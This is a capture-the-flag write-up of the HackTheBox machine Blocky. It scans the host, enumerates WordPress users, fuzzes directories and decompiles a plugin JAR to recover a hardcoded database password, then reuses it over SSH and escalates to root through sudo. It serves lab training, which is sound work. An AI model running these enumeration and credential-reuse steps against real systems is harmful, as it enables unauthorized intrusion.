Blocky

HackTheBox · Easy by Brenno M.

Blocky hosts a WordPress site and a Minecraft server. A Java plugin exposed under /plugins carries a hardcoded password, reused by the user notch over SSH, and that user has unrestricted sudo.

Reconnaissance

Nmap shows FTP, SSH, Apache and Minecraft 1.11.2 on 25565. The site redirects to blocky.htb.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p21,22,80,25565 <IP>
# 21 ftp, 22 OpenSSH 7.2p2, 80 Apache 2.4.18, 25565 Minecraft 1.11.2
echo "<IP> blocky.htb" | sudo tee -a /etc/hosts

The site is WordPress. Its REST API lists the authors, and the only one is notch. Fuzzing finds a /plugins directory with two JAR files.

curl -s http://blocky.htb/wp-json/wp/v2/users | jq -r '.[].slug'
# notch
ffuf -u http://blocky.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
# phpmyadmin, plugins, wiki, wp-admin, ...

Exploitation - credential in the JAR

BlockyCore.jar is the server owner's own plugin. Decompiled, it shows the database credentials written straight into the code.

wget http://blocky.htb/plugins/files/BlockyCore.jar
unzip BlockyCore.jar -d core
javap -c -constants -p core/com/myfirstplugin/BlockyCore.class | grep -A1 sql
public class BlockyCore {
  public String sqlHost = "localhost";
  public String sqlUser = "root";
  public String sqlPass = "<password>";
}

The MySQL root password works over SSH as notch, the WordPress author.

ssh notch@<IP>
cat ~/user.txt

Escalation - sudo

notch can run any command as any user through sudo, with their own password.

sudo -l
# (ALL : ALL) ALL
sudo -i
cat /root/root.txt
